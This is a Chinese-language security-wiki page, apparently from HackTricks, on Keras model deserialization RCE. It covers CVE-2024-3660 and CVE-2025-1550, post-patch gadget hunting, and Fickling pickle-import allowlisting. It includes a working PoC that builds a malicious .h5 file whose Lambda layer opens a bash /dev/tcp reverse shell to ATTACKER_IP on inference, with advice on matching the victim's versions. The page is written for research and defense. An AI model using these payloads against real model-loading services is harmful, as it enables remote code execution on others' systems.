# Keras 模型反序列化 RCE 与 Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

本页总结针对 Keras 模型反序列化流水线的实用 exploitation 技术，说明原生 .keras 格式的内部结构和 attack surface，并提供一套研究工具，用于发现 Model File Vulnerabilities (MFVs) 和修复后的 gadgets。

## .keras 模型格式内部结构

一个 .keras 文件是一个 ZIP archive，至少包含：<sup>[[1]](#references)</sup>
- metadata.json – 通用信息（例如 Keras 版本）
- config.json – 模型架构（主要 attack surface）
- model.weights.h5 – HDF5 格式的权重

config.json 驱动递归反序列化：Keras 会导入模块、解析类和函数，并根据攻击者控制的字典重建层和对象。<sup>[[1]](#references)</sup>

Dense 层对象的示例片段：

```json
{
  "module": "keras.layers",
  "class_name": "Dense",
  "config": {
    "units": 64,
    "activation": {
      "module": "keras.activations",
      "class_name": "relu"
    },
    "kernel_initializer": {
      "module": "keras.initializers",
      "class_name": "GlorotUniform"
    }
  }
}
```

反序列化会执行以下操作：<sup>[[1]](#references)</sup>
- 根据 module/class_name 键导入模块并解析符号
- 使用攻击者控制的 kwargs 调用 from_config(...) 或构造函数
- 递归处理嵌套对象（activations、initializers、constraints 等）

历史上，攻击者构造 config.json 时，可以利用以下三个原语：<sup>[[1]](#references)</sup>
- 控制导入哪些模块
- 控制解析哪些类/函数
- 控制传递给构造函数/from_config 的 kwargs

## CVE-2024-3660 – Lambda 层字节码 RCE

根本原因：
- 旧版 Lambda 反序列化会根据攻击者控制的 marshaled code 重建 Python 函数：`func_load()` 会对 payload 进行 base64 解码，调用 `marshal.loads()`，然后创建一个 `FunctionType`。调用 Lambda 时会运行生成的函数字节码，而受影响的 2.13 之前的 loader 未对旧格式执行 safe-mode 检查。<sup>[[3]](#references)[[16]](#references)[[17]](#references)[[18]](#references)</sup>

在原生 Keras v3 archive 中，Lambda 函数表示为一个 `__lambda__` 对象，其 `code` 字段包含 base64 编码的 marshaled code：<sup>[[17]](#references)[[18]](#references)</sup>

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "exploit_lambda",
    "function": {
      "class_name": "__lambda__",
      "config": {
        "code": "<base64(marshal.dumps(function.__code__))>",
        "defaults": null,
        "closure": null
      }
    }
  }
}
```

缓解措施：
- 对于原生 Keras v3 格式，Keras 默认强制启用 `safe_mode=True`。除非用户显式通过 `safe_mode=False` 选择退出，否则会阻止序列化的 `Lambda` Python lambda；这种保护对旧版格式的覆盖方式并不相同。<sup>[[1]](#references)[[16]](#references)[[17]](#references)</sup>

注意：
- 旧版格式（较早的 HDF5 保存文件）或较旧的代码库可能不会执行现代检查，因此当受害者使用较旧的加载器时，“降级”风格的攻击仍可能奏效。

## CVE-2025-1550 – Keras 3.0.0–3.8.x 中的任意模块导入

根本原因：
- `_retrieve_class_or_fn` 对来自 `config.json`、由攻击者控制的模块字符串使用了 `importlib.import_module(module)`。
- 影响：精心构造的 `.keras` 归档可以使 `Model.load_model()` 导入攻击者指定的 Python 模块和函数，并触发导入时副作用及使用攻击者控制的参数，即使启用了 `safe_mode=True` 也是如此。<sup>[[1]](#references)[[4]](#references)</sup>

利用思路：

```json
{
  "module": "maliciouspkg",
  "class_name": "Danger",
  "config": {"arg": "val"}
}
```

安全改进（Keras ≥ 3.9）：<sup>[[1]](#references)[[2]](#references)</sup>
- 模块 allowlist：导入仅限官方生态系统模块：keras、keras_hub、keras_cv、keras_nlp
- 默认启用安全模式：safe_mode=True 会阻止加载不安全的 Lambda 序列化函数
- 基本类型检查：反序列化对象必须符合预期类型

## 实际利用：TensorFlow-Keras HDF5（.h5）Lambda RCE

旧版 TensorFlow-Keras 部署可能仍接受 HDF5 模型文件（`.h5`）。如果攻击者能够上传模型，且服务器之后会加载该模型或对其执行推理，那么存在漏洞的加载器可能会反序列化包含攻击者控制的 Python 代码的 Lambda 层，并在应用程序的模型工作流中执行该代码。<sup>[[3]](#references)[[7]](#references)[[16]](#references)</sup>

用于构造恶意 .h5 的最简 PoC：当目标调用模型时，Lambda 会执行反向 shell：

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
    return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```

注意事项和可靠性提示：
- 触发时机因格式和工作流而异；引用的文章观察到 payload 在预测期间执行了两次。应将副作用视为可能重复发生，并确保 payload 幂等。<sup>[[7]](#references)</sup>
- 固定版本：使受害者的 TF/Keras/Python 版本保持一致，以避免序列化不匹配。例如，如果目标使用 Python 3.8 和 TensorFlow 2.13.1，就使用这些版本构建工件。<sup>[[7]](#references)</sup>
- 快速复现环境：

```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```

- 验证：像 `os.system("ping -c 1 YOUR_IP")` 这样的无害 payload 有助于确认代码是否执行（例如，使用 tcpdump 观察 ICMP），之后再切换到 reverse shell。<sup>[[7]](#references)</sup>

## 修复后 allowlist 内的 gadget 攻击面

即使启用了 Keras 模块 allowlist 和 safe mode，允许调用的函数仍可能产生副作用。例如，`keras.utils.get_file` 会下载 URL 并将其写入配置的缓存位置，因此可作为 gadget 分析的候选对象。<sup>[[1]](#references)[[19]](#references)</sup>

候选 Lambda 配置（请在受控测试中验证调用签名）：

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "dl",
    "function": {
      "module": "keras.utils",
      "class_name": "get_file",
      "config": null,
      "registered_name": null
    },
    "arguments": {
      "origin": "https://example.com/artifact.bin",
      "cache_dir": "/tmp/keras-cache"
    }
  }
}
```

重要限制：
- `Lambda.call()` 始终将模型输入作为第一个位置参数传递，并将配置的 `arguments` 作为关键字参数传递。对于 `get_file`，该位置参数会填入 `fname`；tensor/path 不匹配可能导致此候选项在下载前失败，因此它并不是保证可用的 gadget。<sup>[[1]](#references)[[16]](#references)[[19]](#references)</sup>

## AI/ML 模型的 ML pickle 导入白名单（Fickling）

许多 AI/ML 模型格式（PyTorch `.pt`/`.pth`/`.ckpt`、joblib/scikit-learn artifacts，以及其他 Python 原生格式）都嵌入了 Python pickle 数据。上文介绍的旧版 Keras Lambda 路径使用的是 marshaled 函数字节码，因此属于另一种反序列化风险。pickle 操作码可在反序列化期间调用攻击者控制的行为，包括篡改模型或 RCE；简单的扫描器可能会漏掉新型或未列入清单的危险导入。<sup>[[7]](#references)[[8]](#references)[[14]](#references)[[18]](#references)</sup>

一种实用的 fail-closed 防御方法是 hook Python 的 pickle 反序列化器，仅允许在 unpickling 期间导入经过审核的一组无害 ML 相关模块。Trail of Bits 的 Fickling 实现了此策略，并附带一个精选的 ML 导入白名单，该名单基于数千个公开的 Hugging Face pickle 构建。<sup>[[8]](#references)[[13]](#references)</sup>

“安全”导入的安全模型（从研究和实践中提炼出的经验判断）：pickle 使用的导入符号必须同时满足以下条件：<sup>[[8]](#references)</sup>
- 不执行代码或导致代码执行（不包含编译或源代码对象、不调用 shell、不使用 hooks 等）
- 不获取或设置任意属性或元素
- 不从 pickle VM 导入或获取对其他 Python 对象的引用
- 不触发任何二级反序列化器（例如 marshal、嵌套 pickle），即使是间接触发

应尽可能在进程启动时尽早启用 Fickling 的保护，以便检查框架执行的任何 pickle 加载操作（torch.load、joblib.load 等）：<sup>[[9]](#references)</sup>

```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```

操作提示：
- 在需要时，你可以暂时禁用/重新启用 hooks：<sup>[[9]](#references)</sup>

```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```

- 如果已知良好的模型被拦截，请在检查符号后，为你的环境扩展 allowlist：<sup>[[9]](#references)</sup>

```python
fickling.hook.activate_safe_ml_environment(also_allow=[
    "package.subpackage.safe_symbol",
    "another.safe.import",
])
```

- Fickling 还提供通用的运行时防护机制，便于进行更精细的控制：<sup>[[9]](#references)</sup>
  - fickling.always_check_safety() 可对所有 pickle.load() 强制执行检查
  - 使用 with fickling.check_safety(): 进行作用域限定的强制检查
  - fickling.load(path) / fickling.is_likely_safe(path) 用于单次检查

- 尽可能优先使用非 pickle 模型格式（例如 SafeTensors）。<sup>[[15]](#references)</sup> 如果必须接受 pickle，请在最低权限环境中运行加载器，禁用网络出站访问，并强制执行 allowlist。

这种 allowlist 优先策略已证明能阻止常见的 ML pickle exploit 路径，同时保持较高的兼容性。在 ToB 的基准测试中，Fickling 检出了 100% 的合成恶意文件，并允许来自顶级 Hugging Face 仓库的约 99% 的干净文件通过。<sup>[[8]](#references)[[10]](#references)</sup>


## 研究人员工具包

1) 系统地发现允许模块中的 gadget

枚举 keras、keras_nlp、keras_cv、keras_hub 中的候选可调用对象，并优先检查那些会产生文件、网络、进程或环境副作用的对象。<sup>[[1]](#references)</sup>

<details>
<summary>枚举 allowlist 中 Keras 模块的潜在危险可调用对象</summary>

```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
    if not hasattr(mod, "__path__"):
        return
    for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
        yield m.name

candidates = []
for root in ALLOWLIST:
    try:
        r = importlib.import_module(root)
    except Exception:
        continue
    for name in iter_modules(r):
        if name in seen:
            continue
        seen.add(name)
        try:
            m = importlib.import_module(name)
        except Exception:
            continue
        for n, obj in inspect.getmembers(m):
            if inspect.isfunction(obj) or inspect.isclass(obj):
                sig = None
                try:
                    sig = str(inspect.signature(obj))
                except Exception:
                    pass
                doc = (inspect.getdoc(obj) or "").lower()
                text = f"{name}.{n} {sig} :: {doc}"
                # Heuristics: look for I/O or network-ish hints
                if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
                    candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```

</details>

2) 直接测试反序列化（无需 .keras archive）

将精心构造的 dict 直接传入 Keras deserializers，以了解可接受的参数并观察副作用。<sup>[[1]](#references)</sup>

```python
import keras

cfg = {
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "probe",
    "function": {
      "module": "keras.utils",
      "class_name": "get_file",
      "config": null,
      "registered_name": null
    },
    "arguments": {
      "origin": "https://example.com/x",
      "cache_dir": "/tmp/keras-cache"
    }
  }
}

layer = keras.saving.deserialize_keras_object(cfg, safe_mode=True)  # Observe behavior
```

3) 跨版本探测与格式

Keras 存在多个代码库/发展阶段，各自的防护措施和格式也有所不同：<sup>[[1]](#references)</sup>
- TensorFlow 内置 Keras：tensorflow/python/keras（旧版，计划删除）
- tf-keras：单独维护
- Multi-backend Keras 3（官方版）：引入原生 .keras 格式

在不同代码库和格式（.keras 与旧版 HDF5）中重复测试，以发现回归问题或缺失的防护措施。

## References

- [1] [探寻 Keras 模型反序列化中的漏洞（huntr 博客）](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – 为序列化添加检查](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – Keras Lambda 反序列化 RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Keras 任意模块导入（≤ 3.8）](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [huntr 报告 – 任意导入 #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [huntr 报告 – 任意导入 #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – TensorFlow .h5 Lambda RCE 提权至 root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Trail of Bits 博客 – Fickling 推出的新款 AI/ML pickle 文件扫描器](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – 保护 AI/ML 环境（README）](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Fickling pickle 扫描基准语料库](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Sleepy Pickle 攻击背景介绍](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [SafeTensors 项目](https://github.com/safetensors/safetensors)
- [16] [CERT/CC VU#253266 – Keras 2 Lambda 层允许任意代码注入](https://kb.cert.org/vuls/id/253266)
- [17] [Keras Lambda 层源代码（v3.10.0）](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/layers/core/lambda_layer.py)
- [18] [Keras Python utilities 源代码（v3.10.0）](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/utils/python_utils.py)
- [19] [Keras `get_file` API](https://keras.io/api/utils/python_utils/#get_file-function)
{{#include ../../banners/hacktricks-training.md}}
